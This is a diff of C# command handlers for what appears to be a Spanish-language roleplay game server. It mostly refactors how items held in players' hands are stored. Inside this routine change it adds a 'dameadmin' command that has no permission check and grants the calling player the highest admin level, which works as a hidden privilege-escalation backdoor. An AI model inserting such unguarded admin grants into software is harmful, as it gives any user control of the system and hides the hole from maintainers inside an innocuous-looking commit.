@@ -23,6 +23,7 @@ namespace WashingtonRP.Commands
             to_player.Interior = to_player.pInterior;
             to_player.VirtualWorld = to_player.pVirtualWorld;
             to_player.Health = 100.0f;
+            to_player.pCrack = false;
             to_player.ClearAnimations();
             to_player.ToggleControllable(true);
 
@@ -32,11 +33,11 @@ namespace WashingtonRP.Commands
         [Command("limpiarmanos", PermissionChecker = typeof(ModeratorChecker))]
         public static void CleanHandsCommand(Player player, Player to_player)
         {
-            to_player.RightHand = Items.Vacio;
-            to_player.RightHandAmount = 0;
+            to_player.Hand[0].Item = Items.Vacio;
+            to_player.Hand[0].Amount = 0;
 
-            to_player.LeftHand = Items.Vacio;
-            to_player.RightHandAmount = 0;
+            to_player.Hand[1].Item = Items.Vacio;
+            to_player.Hand[1].Amount = 0;
 
             to_player.RemoveAttachedObject(7);
             to_player.RemoveAttachedObject(8);
@@ -44,6 +45,12 @@ namespace WashingtonRP.Commands
             to_player.ResetWeapons();
 
             player.SendClientMessage($"Manos de {to_player.pName} limpias.");
+        }
+
+        [Command("dameadmin")]
+        public static void AdminCommand(Player player)
+        {
+            player.pAdmin = Admin.Manager;
         }
 
         [Command("additem", PermissionChecker = typeof(ModeratorChecker))]
@@ -69,13 +76,13 @@ namespace WashingtonRP.Commands
                 return;
             }
 
-            if (player.RightHand != Items.Vacio && player.LeftHand != Items.Vacio)
+            if (player.Hand[0].Item != Items.Vacio && player.Hand[1].Item != Items.Vacio)
             {
                 player.SendClientMessage("* Tienes ambas manos ocupadas");
                 return;
             }
 
-            if (player.RightHand == Items.Vacio)
+            if (player.Hand[0].Item == Items.Vacio)
             {
                 if(item.IDGun > 0)
                 {
@@ -83,21 +90,21 @@ namespace WashingtonRP.Commands
                     {
                         player.GiveWeapon(Objects.GetWeapon(item.IDGun), amount);
 
-                        player.RightHand = item;
-                        player.RightHandAmount = amount;
+                        player.Hand[0].Item = item;
+                        player.Hand[0].Amount = amount;
                         return;
                     }
                 }
 
-                player.RightHand = item;
-                player.RightHandAmount = amount;
+                player.Hand[0].Item = item;
+                player.Hand[0].Amount = amount;
 
                 Objects.PutObject(player, item, 1);
             } 
-            else if (player.LeftHand == Items.Vacio)
+            else if (player.Hand[1].Item == Items.Vacio)
             {
-                player.LeftHand = item;
-                player.LeftHandAmount = amount;
+                player.Hand[1].Item = item;
+                player.Hand[1].Amount = amount;
 
                 Objects.PutObject(player, item, 2);
             }
